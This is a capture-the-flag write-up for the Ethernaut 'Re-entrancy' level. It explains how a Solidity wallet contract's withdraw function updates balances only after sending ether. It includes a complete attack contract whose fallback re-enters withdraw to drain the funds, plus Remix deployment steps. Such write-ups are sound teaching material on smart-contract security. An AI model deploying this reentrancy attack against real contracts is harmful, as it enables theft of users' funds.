# Re-entrancy

> The goal of this level is for you to steal all the funds from the contract.

> Things that might help:
> * Untrusted contracts can execute code where you least expect it.
> * Fallback methods
> * Throw/revert bubbling
> * Sometimes the best way to attack a contract is with another contract.
> * See the Help page above, section "Beyond the console"

```solidity
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public constant returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() payable {}
}
```

I believe this one to be the best level in the game. We are supposed to use reentrancy to steal funds from a simple "wallet" contract.

But what is reentrancy after all?

> In computing, a computer program or subroutine is called reentrant if it can be interrupted in the middle of its execution and then safely be called again ("re-entered") before its previous invocations complete execution.

The only piece of complex logic there is the `withdraw` function, which calls the `msg.sender` contract. This implies we have to write a calling contract to act as our instance's `msg.sender` by calling its `withdraw` method. Since the challenge is supposed to involve reentrancy, we imagine that we have to figure out a way to call `withdraw` again within the same transaction.

The `withdraw` function is going to return to us whatever amount of money we deposit with `donate`. Remember by "we" I mean our contract. This means our contract needs a fallback method, from which we may be able to call `withdraw` again. But why would we call `withdraw` more than once in the same transaction?

Note that our contract's balance in the level contract is only updated *after* the call to it, meaning that, if we have enough funds to be withdrawn at our contract's first `withdraw` call, all subsequent calls to `withdraw` that happen *before* the balance is updated will think we have enough in our contract's balance, allowing us to withdraw funds we don't have from the contract.

The plan for our contract is, then:
1. We do a donate call for X ether;
2. We do a first withdraw call for X ether;
3. The withdraw function calls our fallback sending X ether;
4. Our fallback does a second withdraw call for X ether, where the magic happens;
5. Steps 3 and 4 repeat many times;
6. Eventually we stop calling withdraw in our fallback, the calls end, the transaction succeeds and we've stolen a bunch of ether.

The last step is very important, because we don't want our transaction to be out of gas, which would throw an exception and revert the state changes we've made. We need a counter to limit the recursion.

The final code looks like this:

```solidity
pragma solidity ^0.4.0;

contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable;

    function balanceOf(address _who) public constant returns (uint balance);

    function withdraw(uint _amount) public;

    function() public payable {}
}

contract RSolve {
    Reentrance victim;
    uint public count;

    function RSolve(address ct) public payable {
        // Store our Reentrance instance
        victim = Reentrance(ct);
    }

    function attack(uint v) public {
        // Donate some value X using our address as the _to parameter
        victim.donate.value(v)(this);

        // Withdraw some value X
        victim.withdraw(v);
    }

    function() public payable {
        // Receiver for funds withdrawn by the attack
        if (count < 30) {
            count++;
            // Reentrant withdraw calls
            victim.withdraw(msg.value);
        }
    }
}
```

Now it's time to open Remix and paste our contract there.

We pass the instance address between quotes in the "address" parameter of the constructor and then call `attack`.

Verify the instance's balance with:

```javascript
(await getBalance(instance)).toNumber()
```

When it returns 0, submit the instance.
